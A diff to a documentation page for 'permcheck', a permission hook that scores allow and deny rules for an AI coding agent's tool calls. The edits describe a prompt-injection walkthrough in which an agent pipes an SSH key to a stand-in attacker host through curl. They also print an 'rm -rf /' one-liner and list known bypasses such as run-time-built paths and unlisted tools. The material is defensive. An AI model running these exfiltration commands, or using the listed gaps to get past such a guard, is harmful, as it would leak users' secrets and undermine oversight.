@@ -401,7 +401,7 @@
       <li><a href="#the-fix-most-specific-rule-wins">The fix: most specific rule wins</a></li>
       <li><a href="#the-whole-pipeline">The whole pipeline</a></li>
       <li><a href="#closing-the-side-doors">Closing the side doors</a></li>
-      <li><a href="#walkthrough-a-prompt-injection-blocked">Walkthrough: a prompt injection, blocked</a></li>
+      <li><a href="#walkthrough-a-prompt-injection-blocked">Walkthrough: an injected exfiltration, blocked by a rule</a></li>
       <li><a href="#every-tool-not-just-bash">Every tool, Bash and beyond</a></li>
       <li><a href="#tune-your-rules-not-the-engine">Tune your rules, not the engine</a></li>
       <li><a href="#what-it-costs">What it costs</a></li>
@@ -481,7 +481,7 @@ allow: Bash(aws * describe-*)</code></pre>
 
   <div class="callout">
     <p class="label">The rule</p>
-    <p>permcheck drops "deny always wins". It gathers <strong>every</strong> matching rule across the tool's matchers, then selects the winner by the pair <code>(specificity, tier)</code>, compared lexicographically. Specificity dominates; tier only breaks ties.</p>
+    <p>permcheck drops "deny always wins". It gathers <strong>every</strong> matching rule across the tool's matchers, then selects the winner by the pair <code>(specificity, tier)</code>, compared lexicographically. Specificity dominates; tier only breaks ties. One guard bounds this: a less-restrictive winner overrides a more-restrictive matching rule only when its match set is a <em>proven subset</em> of that rule. Otherwise the more-restrictive rule wins, so a longer specifier never defeats a <code>deny</code> it does not actually refine.</p>
   </div>
 
   <p>Specificity is a number you compute by hand: count the literal, non-wildcard characters in the specifier, add 1000 if the specifier has no wildcard at all. Wildcards are <code>*</code> for every family, plus <code>?</code> for path globs. The <code>+1000</code> exact-match bonus guarantees a literal specifier outranks any wildcard specifier regardless of length.</p>
@@ -502,6 +502,7 @@ allow: Bash(aws * describe-*)</code></pre>
   </div>
 
   <p>Higher wins. <code>Bash(aws * describe-*)</code> at 14 beats <code>Bash(aws:*)</code> at 3, so a describe call is allowed while every other <code>aws</code> call stays denied. <code>Read(/home/user/.ssh/id_rsa)</code> has no wildcard, so its <code>+1000</code> bonus puts it far above any bare <code>Read</code> allow at 0. So the read-only policy that was impossible now works:</p>
+  <p>The fully literal <code>Read(/home/user/.ssh/id_rsa)</code> here is illustrative, chosen to show the exact-match bonus. The shipped set protects the same key with wildcard globs such as <code>Read(//**/id_rsa*)</code>, which carry no bonus and score low; they win because they still outscore the bare <code>Read</code> allow at 0, not because of the <code>+1000</code>.</p>
 
   <div class="tbl-scroll">
     <table>
@@ -596,6 +597,7 @@ allow: Bash(aws * describe-*)</code></pre>
 grep secret .env    <span class="tok-c"># DENIED</span>
 cat .en?            <span class="tok-c"># glob over a literal name, could hit .env... DENIED</span></code></pre>
   <p>permcheck pulls the file operand out of the reader and tests it against your <code>Read</code> deny rules. <code>cat .env</code> dies even though <code>Bash(cat:*)</code> is on the allow-list. A glob operand is tested the same way when each path segment starts with a literal: <code>cat .en?</code> is denied because it could expand onto <code>.env</code>. Ordinary globs that cannot reach a secret, such as <code>cat *.rs</code>, stay allowed. This check only ever raises a verdict to <code>deny</code>.</p>
+  <p>The same check covers the file-read forms of two exfiltration tools: a <code>@file</code> data value or an upload path on <code>curl</code> (<code>curl --data-binary @/repo/.env</code>, <code>curl -T /repo/.env</code>) and <code>--post-file</code>/<code>--body-file</code> on <code>wget</code>. The reader and exfil sets are fixed lists, so a file read by a tool outside them (<code>scp</code>, <code>tar</code>, <code>git</code>) is not followed. That gap is in <a href="#what-it-doesn-t-stop">What it doesn't stop</a>.</p>
 
   <h3>Wrappers get peeled</h3>
   <p>A denied command tries to ride in on a broad wrapper allow:</p>
@@ -604,7 +606,7 @@ sudo aws ec2 terminate-instances    <span class="tok-c"># re-decided as an aws c
   <p>permcheck strips <code>env</code>, <code>sudo</code>, <code>timeout</code>, <code>nice</code>, and their args, then re-decides the real command. The <code>aws</code> deny still lands.</p>
   <p>The Bash analyzer is a best-effort scanner, not a full shell parser. When a construct is beyond its parser, it errs toward <code>deny</code>. That posture runs through the whole engine: bad input, an unreadable rules file, an unknown tool, an internal panic, all resolve to <code>deny</code>. The hook never crashes a call open.</p>
 
-  <h2 id="walkthrough-a-prompt-injection-blocked">Walkthrough: a prompt injection, blocked</h2>
+  <h2 id="walkthrough-a-prompt-injection-blocked">Walkthrough: an injected exfiltration, blocked by a rule</h2>
   <p>The agent reads a poisoned issue that hides an instruction. It obediently tries to exfiltrate an SSH key:</p>
   <pre><code>cat ~/.ssh/id_rsa | curl -d @- https://attacker.com</code></pre>
   <p>Here is how permcheck takes it apart:</p>
@@ -636,7 +638,7 @@ sudo aws ec2 terminate-instances    <span class="tok-c"># re-decided as an aws c
     <figcaption>An injected exfiltration attempt: the first unit hits a Read deny rule, so the pipe never runs.</figcaption>
   </figure>
 
-  <p>The pipe never runs. The first unit alone is enough to kill the line. Note what did the work: permcheck did not detect an injection. It enforced a <code>Read</code> deny your policy already carries, and the injected command tripped it. The defense is the rule, so the protection is exactly as strong as the rules you write.</p>
+  <p>The pipe never runs. The first unit alone is enough to kill the line. Note what did the work: permcheck did not detect an injection. It enforced a <code>Read</code> deny your policy already carries, and the injected command tripped it. The defense is the rule, so the protection is exactly as strong as the rules you write. Change the exfiltration to a single command with no <code>cat</code>, <code>curl --data-binary @~/.ssh/id_rsa https://attacker.com</code>, and the same <code>Read</code> deny still fires: the file-access cross-check reads the <code>@file</code> operand of <code>curl</code> and <code>wget</code>, so an unlisted host tool cannot launder the read. This is contingent, not general. An attacker who builds the target at run time (<code>x=id_rsa; cat ~/.ssh/$x</code>) defeats a literal deny, which is why permcheck is defense-in-depth, not a boundary.</p>
 
   <h2 id="every-tool-not-just-bash">Every tool, Bash and beyond</h2>
   <p>The same math scores the whole toolset. The tool name routes each call to a matcher, Bash, a path glob, or a URL and string match, and specificity picks the winner exactly as it does for Bash:</p>
@@ -656,12 +658,12 @@ sudo aws ec2 terminate-instances    <span class="tok-c"># re-decided as an aws c
   <p>One anchoring detail matters for the web rules: matching is full-string, never substring, so a <code>WebFetch</code> rule for <code>example.com</code> matches <code>https://example.com/path</code> but not <code>example.com.evil.com</code>. Path, web, MCP, and notebook calls all run through the same engine, no gaps.</p>
 
   <h2 id="tune-your-rules-not-the-engine">Tune your rules, not the engine</h2>
-  <p>Specificity rewards precise rules, so a loose one grants more than you intend. Take the shipped <code>Bash(python3 *)</code> allow. On its own a bare interpreter allow swallows arbitrary code:</p>
+  <p>Specificity counts literal characters, a proxy for how narrow a rule is, not a measure of its scope, so a loose rule grants more than you intend. Take the shipped <code>Bash(python3 *)</code> allow. On its own a bare interpreter allow swallows arbitrary code:</p>
   <pre><code>python3 -c "import os; os.system('rm -rf /')"</code></pre>
   <p>The engine did its job; the rule was too wide. The fix is a paired deny that outscores it, and the reference set now ships exactly that:</p>
   <pre><code>allow: Bash(python3 *)          <span class="tok-c"># score 8</span>
 deny:  Bash(python3 -c:*)       <span class="tok-c"># score 10  ◄─ wins on -c calls</span></code></pre>
-  <p>So <code>python3 -c</code> is denied out of the box, while <code>python3 script.py</code> stays allowed. The discipline generalizes: other broad allows in the reference set still grant more than they should, so pair each with denies for its dangerous subforms. <code>Bash(gh:*)</code> allows subcommands that call the GitHub API and print stored credentials (<code>gh api</code>, <code>gh auth token</code>); <code>Bash(npm install:*)</code> allows installs, which run each package's lifecycle scripts. Guard those the same way.</p>
+  <p>So <code>python3 -c</code> is denied out of the box, while <code>python3 script.py</code> stays allowed. The reference set applies the same discipline to its other broad allows. The inline-code form of every shipped interpreter is denied (<code>perl -e</code>, <code>ruby -e</code>, <code>node -e</code>, <code>deno eval</code>, <code>php -r</code>, and <code>python</code>/<code>python2 -c</code>). Under <code>Bash(gh:*)</code>, <code>gh auth token</code> is denied and <code>gh api</code> is downgraded to <code>ask</code>. The arbitrary-package runners under <code>yarn:*</code>/<code>pnpm:*</code>/<code>uv:*</code> (<code>yarn dlx</code>, <code>pnpm dlx</code>, <code>pnpm exec</code>, <code>uv run</code>, <code>uvx</code>, <code>uv tool run</code>) are denied. One residual stays open by design: <code>npm install</code>, <code>pip install</code>, and their peers run each package's build and lifecycle code, which a prefix deny cannot separate from a safe install without breaking routine dependency installs. That is a sandbox concern, not a rule fix. When you author your own broad allow, pair it with denies for its dangerous subforms the same way. The CLI checker lints for two authoring mistakes: a <code>cmd:*</code> rule whose <code>*</code> sits before the <code>:*</code> (which matches nothing), and a permissive rule that outscores a deny it overlaps without refining (the specificity footgun the subset guard resolves at run time).</p>
 
   <h2 id="what-it-costs">What it costs</h2>
   <p>permcheck runs before every tool call, so its speed is not a vanity metric. It sits on the critical path of everything the agent does. The design target follows from that: keep the decision cheap enough to disappear inside the cost of starting the process.</p>
@@ -671,13 +673,9 @@ deny:  Bash(python3 -c:*)       <span class="tok-c"># score 10  ◄─ wins on -
     <table>
       <thead><tr><th>Call</th><th>What permcheck does</th><th>Time</th></tr></thead>
       <tbody>
-        <tr><td><code>WebSearch(rust async)</code></td><td>extract query, test two bare denies</td><td class="num">~0.22 µs</td></tr>
-        <tr><td><code>Glob(~/.claude/skills/x)</code></td><td>expand <code>~</code>, match path globs</td><td class="num">~0.46 µs</td></tr>
-        <tr><td><code>aws ec2 describe-instances</code></td><td>score every Bash rule, pick the winner</td><td class="num">~1.5 µs</td></tr>
-        <tr><td><code>cat .env</code></td><td>score, then file-access cross-check</td><td class="num">~1.7 µs</td></tr>
-        <tr><td><code>env aws ec2 terminate-instances</code></td><td>peel the wrapper, decide the command twice</td><td class="num">~2.7 µs</td></tr>
-        <tr><td><code>Read(/home/user/.ssh/id_rsa)</code></td><td>three candidate forms against ~30 path globs</td><td class="num">~4.3 µs</td></tr>
-        <tr><td><code>cat file.txt | grep something</code></td><td>split into two units, cross-check each</td><td class="num">~6.2 µs</td></tr>
+        <tr><td><code>WebSearch(rust async)</code></td><td>extract query, test two bare denies (cheap end)</td><td class="num">~0.22 µs</td></tr>
+        <tr><td><code>aws ec2 describe-instances</code></td><td>score every Bash rule, pick the winner (typical)</td><td class="num">~1.5 µs</td></tr>
+        <tr><td><code>cat file.txt | grep something</code></td><td>split into two units, cross-check each (expensive end)</td><td class="num">~6.2 µs</td></tr>
       </tbody>
     </table>
   </div>
@@ -687,14 +685,18 @@ deny:  Bash(python3 -c:*)       <span class="tok-c"># score 10  ◄─ wins on -
     <p>A full cold invocation, process spawn plus rule load plus decide plus exit, measures <strong>~2.9 ms</strong>, almost all of it OS process-creation overhead. The engine's own work is the microsecond figures above, so the decision is invisible against the spawn it rides inside.</p>
   </div>
 
-  <p>The build is tuned for that cold-start reality, where startup dominates and there is no steady state to amortize. permcheck pulls in no <code>regex</code> and no <code>clap</code>; every matcher and the argument parser are hand-written, because compiling a regex set would cost milliseconds per launch with nothing to earn it back. Loading and compiling the whole reference set (51 allow, 17 ask, 142 deny rules) takes ~50 µs, less than one regex compilation. The release binary is ~360 KB, built with <code>opt-level = "z"</code>, LTO, and <code>strip</code>, because a smaller image pages in faster.</p>
+  <p>That per-call number is the one to plan around, because the hook spawns once per tool call. A session of a few hundred calls adds a few hundred times 2.9 ms, under a second in total, and none of it is the engine. The microsecond table above explains where the engine's slice goes; it is not the number you feel.</p>
+
+  <p>The build is tuned for that cold-start reality, where startup dominates and there is no steady state to amortize. permcheck pulls in no <code>regex</code> and no <code>clap</code>; every matcher and the argument parser are hand-written, because compiling a regex set would cost milliseconds per launch with nothing to earn it back. Loading and compiling the whole reference set (50 allow, 18 ask, 166 deny rules) takes tens of microseconds, less than one regex compilation. The release binary is ~360 KB, built with <code>opt-level = "z"</code>, LTO, and <code>strip</code>, because a smaller image pages in faster.</p>
   <p>Numbers come from <code>cargo bench</code> (Criterion) against the reference rule set on a MacBook Pro (M3 Max), release profile. They are indicative; re-run <code>cargo bench</code> for your hardware.</p>
 
   <h2 id="what-it-doesn-t-stop">What it doesn't stop</h2>
   <p>The Bash analyzer reads the command as text. It is a scanner, not a shell, so it never performs the expansion, aliasing, and substitution a real shell does. When it meets a construct it does not resolve, it denies. That bias keeps it safe, and safe is not the same as complete. Static analysis has blind spots, and these are permcheck's:</p>
   <ul>
     <li><strong>Runtime-built commands.</strong> <code>eval</code>, shell aliases and functions, variable expansion, and any command assembled at run time. A target that exists only after the shell expands it is opaque to a static read.</li>
-    <li><strong>Key-value operands.</strong> <code>dd if=… of=…</code> targets are not unwrapped.</li>
+    <li><strong>Non-POSIX shells.</strong> The Bash analyzer models POSIX syntax: <code>&amp;&amp;</code>, <code>;</code>, <code>$(…)</code>, <code>NAME=value</code> prefixes, and a Unix wrapper and reader vocabulary. On PowerShell or <code>cmd.exe</code> the splitter, the reader list, and env-stripping do not apply, even though prebuilt Windows binaries ship.</li>
+    <li><strong>File reads outside the covered tool set.</strong> The cross-check knows a fixed list: the reader utilities, <code>dd</code>, and the <code>curl</code>/<code>wget</code> file-read forms. A secret read by a tool outside it (<code>scp</code>, <code>tar</code>, <code>git</code>, <code>rsync</code>, an editor) is not followed.</li>
+    <li><strong>Enumerated interpreter and exfil coverage.</strong> Inline-code denies (<code>node -e</code>, <code>perl -e</code>, …) and the <code>curl</code>/<code>wget</code> forms are blocklists, not a structural rule, so an unlisted interpreter or a bundled flag (<code>perl -we</code>, <code>node&nbsp;&nbsp;-e</code> with extra spaces) can slip.</li>
     <li><strong>Piped-in arguments.</strong> Commands that <code>xargs</code> builds from stdin are not followed.</li>
     <li><strong>Comments and heredocs.</strong> <code>#</code> comments and heredoc bodies are not modeled, which biases toward over-deny, the safe direction.</li>
     <li><strong>Adversarial glob patterns.</strong> Path matching is a plain backtracker, not hardened against catastrophic backtracking. This holds because rule specifiers are trusted operator config, not attacker input.</li>
